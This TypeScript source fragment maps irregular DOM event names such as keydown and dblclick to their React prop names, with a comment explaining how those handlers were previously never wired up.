          const index = evaluate(expr.property, context, locals, 0);
          if (typeof index === 'number' || typeof index === 'string') {
            return typeof index === 'number'
              ? `${objectPath}[${index}]`
              : `${objectPath}["${index}"]`;
          }
        }
        // Without a context there is nothing to resolve against; the caller
        // gets the old placeholder rather than a silently wrong path.
        return `${objectPath}[${expr.property.name}]`;
      }
    }
  }

  return null;
}

/**
 * Capitalize first letter
 */
function capitalize(str: string): string {
  return str.charAt(0).toUpperCase() + str.slice(1);
}

/**
 * DOM event names whose React prop is not `on` + the capitalised name.
 *
 * `@click` works because React calls it `onClick`. `@keydown` does not, because
 * React calls it `onKeyDown` and no rule turns one into the other — `dblclick`
 * becomes `onDoubleClick`, which no amount of casing gets you to. React silently
 * ignores a prop it does not recognise, so the handler was simply never wired
 * up: the control looked normal and did nothing, while `@click` on the same
 * element worked, which reads as a broken handler rather than a broken name.
 *
 * It is reachable from the tools in this repo. The visual builder's event picker
 * offers 'keydown' and 'keyup' (apps/softn-builder PropertyPanel), and the demo
 * bundle in @softn/core uses `@keydown` on its edit field and `@dblclick` to
 * open the editor, so in that bundle neither did anything.
 *
 * Only irregular names are listed. Anything absent keeps the old behaviour,
 * which is what a COMPONENT callback needs: `@press` must stay `onPress`, and a
 * custom `@clearCompleted` must stay `onClearCompleted`. The lookup is on the
 * name exactly as authored, so `@keyDown` written in camelCase already resolved
 * correctly and still does.
 */
const REACT_EVENT_PROPS: Readonly<Record<string, string>> = {
  keydown: 'onKeyDown',
  keyup: 'onKeyUp',
  keypress: 'onKeyPress',
  dblclick: 'onDoubleClick',
  doubleclick: 'onDoubleClick',
  mousedown: 'onMouseDown',
  mouseup: 'onMouseUp',
  mouseenter: 'onMouseEnter',
  mouseleave: 'onMouseLeave',
  mousemove: 'onMouseMove',
  mouseover: 'onMouseOver',
  mouseout: 'onMouseOut',
  contextmenu: 'onContextMenu',
  pointerdown: 'onPointerDown',
  pointerup: 'onPointerUp',
  pointermove: 'onPointerMove',
  pointerenter: 'onPointerEnter',
  pointerleave: 'onPointerLeave',
  pointerover: 'onPointerOver',
  pointerout: 'onPointerOut',
  pointercancel: 'onPointerCancel',
  lostpointercapture: 'onLostPointerCapture',
  gotpointercapture: 'onGotPointerCapture',
  touchstart: 'onTouchStart',
  touchend: 'onTouchEnd',
  touchmove: 'onTouchMove',
  touchcancel: 'onTouchCancel',
  dragstart: 'onDragStart',
  dragend: 'onDragEnd',
  dragenter: 'onDragEnter',
  dragleave: 'onDragLeave',
  dragover: 'onDragOver',
  animationstart: 'onAnimationStart',
  animationend: 'onAnimationEnd',
  animationiteration: 'onAnimationIteration',
  transitionend: 'onTransitionEnd',
  compositionstart: 'onCompositionStart',
  compositionend: 'onCompositionEnd',
  compositionupdate: 'onCompositionUpdate',
  timeupdate: 'onTimeUpdate',
  volumechange: 'onVolumeChange',
  ratechange: 'onRateChange',
  durationchange: 'onDurationChange',
  loadeddata: 'onLoadedData',
  loadedmetadata: 'onLoadedMetadata',
  loadstart: 'onLoadStart',
  canplay: 'onCanPlay',
  canplaythrough: 'onCanPlayThrough',
  contextlost: 'onContextLost',
  contextrestored: 'onContextRestored',
};

/** The React prop name for an authored `@event`. */
export function reactEventProp(name: string): string {
  return REACT_EVENT_PROPS[name] ?? `on${capitalize(name)}`;
}
